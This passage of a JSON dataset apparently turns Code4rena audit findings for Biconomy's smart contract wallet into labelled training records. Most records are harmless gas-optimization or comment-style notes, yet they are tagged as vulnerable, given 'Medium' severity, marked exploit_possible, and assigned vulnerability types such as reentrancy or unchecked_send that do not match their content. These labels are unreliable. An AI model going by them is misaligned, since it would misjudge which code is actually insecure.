    "description": "*scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol* Links: [201](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L201), [237](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L237), [243](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L243), [268](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L268), [292](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L292). 201:        //console.log(\"init %s\", 21000 + msg.data.length * 8); 237:                //console.log(\"sent %s\", startGas - gasleft()); 243:            //console.log(\"extra gas %s \", extraGas);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.301,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n54:    // @notice there is no _nonce \n105:    // @notice authorized modifier (onlySelf) is already inherited\n499:    // @notice Nonce space is locked to 0 for AA transactions\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol* Links: [54](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L54), [105](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L105), [499](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L499). 54:    // @notice there is no _nonce 105:    // @notice authorized modifier (onlySelf) is already inherited 499:    // @notice Nonce space is locked to 0 for AA transactions",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.184,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n85:\t} //unchecked\n187:\t//note: opIndex is ignored (relevant only if mode==postOpReverted, which is only possible outside of innerHandleOp)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol* Links: [85](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L85), [187](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L187). 85:\t} //unchecked 187:\t//note: opIndex is ignored (relevant only if mode==postOpReverted, which is only possible outside of innerHandleOp)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.148,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n*/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol*\nLinks: [103](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol#L103).\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IStakeManager.sol* Links: [69](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IStakeManager.sol#L69). 69:\t/// return the deposit (for gas payment) of the account */scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol* Links: [103](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol#L103).",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.232,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n200:\tuint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol* Links: [200](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L200). 200:\tuint256 startGas = gasleft() + 21000 + msg.data.length * 8;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.074,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n22:\tlet success := call(sub(gas(), 10000), token, 0, add(data, 0x20), mload(data), 0, 0x20)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/common/SecuredTokenTransfer.sol* Links: [22](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/common/SecuredTokenTransfer.sol#L22). 22:\tlet success := call(sub(gas(), 10000), token, 0, add(data, 0x20), mload(data), 0, 0x20)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.101,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n14:\tassembly { csize := extcodesize(account) }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/libs/LibAddress.sol* Links: [14](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/LibAddress.sol#L14). 14:\tassembly { csize := extcodesize(account) }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.056,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n144:\tid := chainid()\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol* Links: [144](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L144). 144:\tid := chainid()",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.03,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n15:\tmapping (address => bool) public isAccountExist;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol* Links: [15](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L15). 15:\tmapping (address => bool) public isAccountExist; **Suggested Change** 15:\tmapping(address => bool) public isAccountExist;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.062,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n10:\t * - the validateUserOp MUST valiate the aggregator parameter, and MAY ignore the userOp.signature field.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol* Links: [10](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol#L10). 10:\t * - the validateUserOp MUST valiate the aggregator parameter, and MAY ignore the userOp.signature field.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.119,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n31:\t// Emit events here..\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol* Links: [31](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol#L31). 31:\t// Emit events here..",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.035,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n8:\t// Could add a flag fromEntryPoint for AA txn\n12:\t// Could add a flag fromEntryPoint for AA txn\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol* Links: [8](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol#L8) / [12](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol#L12). 8:\t// Could add a flag fromEntryPoint for AA txn 12:\t// Could add a flag fromEntryPoint for AA txn",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.108,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " to write _address storage values_  | 8 |\n| [G-22] |++i/i++ should be unchecked{++i}/unchecked{i++} when it is not possible for them to overflow, as is the case when used in for- and while-loops| 6 |\n| [G-23] |Sort Solidity operations using short-circuit mode| 8 |\n| [G-24] |",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Gas",
    "title": "### Gas Optimizations List",
    "description": "| Number | Optimization Details | Context | |:--:|:-------| :-----:| | [G-01] | With assembly, `.call (bool success)` transfer can be done gas-optimized | 8 | | [G-02] |Remove the `initializer` modifier| 1 | | [G-03] |Structs can be packed into fewer storage slots |2 |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.275,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\ncontracts\\smart-contract-wallet\\SmartAccount.sol#l451\n  449     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n- 451:       (bool success,) = dest.call{value:amount}(\"\");\n+            bool success;                                 \n+            assembly {                                    \n+                success := call(gas(), dest, amount, 0, 0)\n+            }                                             \n+                                                          \n  452            require(success,\"transfer failed\");\n  453       }\n  454\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Gas",
    "title": "[G-01] With assembly, `.call (bool success)` transfer can be done gas-optimized",
    "description": "`return` data `(bool success,)` has to be stored due to EVM architecture, but in a usage like below, 'out' and 'outsize' values are given (0,0), this storage disappears and gas optimization is provided. https://twitter.com/pashovkrum/status/1607024043718316032?t=xs30iD6ORWtE2bTTYsCFIQ&s=19 There are 8 instances of the topic. contracts\\smart-contract-wallet\\SmartAccount.sol#l451 449     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.589,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\interfaces\\UserOperation.sol:\n  19:     struct UserOperation {\n  20 \n  21         address sender;                // slot0   (20 bytes)\n- 22         uint256 nonce;                                      \n+ 22         uint96 nonce;                  // slot0   (12 bytes)\n- 23         bytes initCode;                                     \n- 24         bytes callData;                                     \n- 25         uint256 callGasLimit;                               \n- 26         uint256 verificationGasLimit;                       \n- 27         uint256 preVerificationGas;                         \n  28         uint128 maxFeePerGas;          // slot1   (16 bytes)\n  29         uint128 maxPriorityFeePerGas;  // slot1   (16 bytes)\n+ 25         uint256 callGasLimit;          // slot2   (32 bytes)\n+ 26         uint256 verificationGasLimit;  // slot3   (32 bytes)\n+ 27         uint256 preVerificationGas;    // slot4   (32 bytes)\n+ 23         bytes initCode;                // slot5   (32 bytes)\n+ 24         bytes callData;                // slot6   (32 bytes)\n  30         bytes paymasterAndData;        // slot7   (32 bytes)\n  31         bytes signature;               // slot8   (32 bytes)\n  32     } \n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G-03] Structs can be packed into fewer storage slots",
    "description": "The `UserOperation` struct can be packed into one slot less slot as suggested below. scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\interfaces\\UserOperation.sol: 19:     struct UserOperation { 20 21         address sender;                // slot0   (20 bytes)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 23,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\interfaces\\IStakeManager.sol:\n  53:     struct DepositInfo {   \n+             StakeInfo stakeInfo;   \n  54          uint112 deposit;   \n  55          bool staked;   \n- 56          uint112 stakes;        \n- 57          uint32 unstakeDelaySec;\n  58          uint64 withdrawTime;   \n  59     }   \n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "[G-04] `DepositInfo` and `PaymasterData` structs can be rearranged",
    "description": "Gas saving can be achieved by updating the ``DepositInfo`` struct as below. scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\interfaces\\IStakeManager.sol: 53:     struct DepositInfo { +             StakeInfo stakeInfo; 54          uint112 deposit;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.353,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n[EntryPoint.sol#L315](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L315), [EntryPoint.sol#L330](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L330), [EntryPoint.sol#L448](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L448)\n\n[EntryPoint.sol#L321](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L321), [EntryPoint.sol#L365](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L365)\n\n[EntryPoint.sol#L448](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L448)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Gas",
    "title": "[G-05] Duplicated require()/if() checks should be refactored to a modifier or function",
    "description": "contracts\\smart-contract-wallet\\SmartAccount.sol: 258:    if (gasToken == address(0)) { 282:    if (gasToken == address(0)) { [SmartAccount.sol#L258](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L258), [SmartAccount.sol#L282](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L282) contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.961,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\ncontracts\\smart-contract-wallet\\base\\Executor.sol:\n- event ExecutionFailure(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas);\n- event ExecutionSuccess(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas);\n+ event Execution(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas, bool success);\n\n  13     function execute(\n  31         // Emit events here..\n- 32:         if (success) emit ExecutionSuccess(to, value, data, operation, txGas);\n- 33:         else emit ExecutionFailure(to, value, data, operation, txGas);\n+             emit Execution (to, value, data, operation, txGas, success);\n  34     }\n  35     \n  36 }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "[G-07] Instead of `emit ExecutionSuccess` and `emit ExecutionFailure` a single ` emit Execution` is gas efficient",
    "description": "If the `emit ExecutionSuccess` and `emit ExecutionFailure` at the end of the `execute` function are removed and arranged as follows, gas savings will be achieved. The last element of the `event Execution` bool success will indicate whether the operation was successful or unsuccessful, with a value of true or false. contracts\\smart-contract-wallet\\base\\Executor.sol: - event ExecutionFailure(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas); - event ExecutionSuccess(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas); + event Execution(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas, bool success);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.709,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\ncontracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol:\n  41:         require(newAmount <= type(uint112).max, \"deposit overflow\");\n\n  65:         require(stake < type(uint112).max, \"stake overflow\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-13] Use constants instead of type(uintx).max",
    "description": "type(uint120).max or type(uint112).max, etc. it uses more gas in the distribution process and also for each transaction than constant usage. 3 results - 2 files: contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol: 397:       require(maxGasValues <= type(uint120).max, \"AA94 gas values overflow\"); [EntryPoint.sol#L397](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L397)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.216,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol:\n  56        uint256 currentBalance = paymasterIdBalances[msg.sender];\n  57        require(amount <= currentBalance, \"Insufficient amount to withdraw\");\n  58:       paymasterIdBalances[msg.sender] -= amount;\n ",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-14] Add ``unchecked {}`` for subtractions where the operands cannot underflow because of a previous ``require`` or ``if`` statement",
    "description": "require(a <= b); x = b - a => require(a <= b); unchecked { x = b - a } if(a <= b); x = b - a => if(a <= b); unchecked { x = b - a } This will stop the check for overflow and underflow so it will save gas. 2 results - 2 files: contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.313,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n[StakeManager.sol#L42](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L42), [StakeManager.sol#L59](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L59), [StakeManager.sol#L69](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L69), [StakeManager.sol#L84](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L84), [StakeManager.sol#L118](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L118)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Gas",
    "title": "[G-15] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead",
    "description": "When using elements that are smaller than 32 bytes, your contracts gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed. 8 results - 3 files: contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.813,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n[SmartAccount.sol#L109](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L109), [SmartAccount.sol#L120](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L120), [SmartAccount.sol#L127](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L127), [SmartAccount.sol#L449](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L449), [SmartAccount.sol#L455](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L455), [SmartAccount.sol#L460](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L460), [SmartAccount.sol#L465](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L465), [SmartAccount.sol#L489](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489), [SmartAccount.sol#L536](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L536)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Gas",
    "title": "[G-19]  Functions guaranteed to revert_ when callled by normal users can be marked `payable`",
    "description": "If a function modifier or require such as onlyOwner-admin is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2), DUP1(3), ISZERO(3), PUSH2(3), JUMPI(10), PUSH1(3), DUP1(3), REVERT(0), JUMPDEST(1), POP(2) which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost. 18 results - 5 files: contracts\\smart-contract-wallet\\SmartAccount.sol: 109:     function setOwner(address _newOwner) external mixedAuth { 120:     function updateImplementation(address _implementation) external mixedAuth {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol:\n  100:    for (uint256 i = 0; i < opasLen; i++) {\n\n  107:    for (uint256 a = 0; a < opasLen; a++) {\n\n  112:    for (uint256 i = 0; i < opslen; i++) {\n\n  128:    for (uint256 a = 0; a < opasLen; a++) {\n\n  134:    for (uint256 i = 0; i < opslen; i++) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-22] ++i/i++ should be unchecked{++i}/unchecked{i++} when it is not possible for them to overflow, as is the case when used in for- and while-loops",
    "description": "The unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. 6 results - 2 files: contracts\\smart-contract-wallet\\SmartAccount.sol: 468:    for (uint i = 0; i < dest.length;) { [SmartAccount.sol#L468](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L468)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.322,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
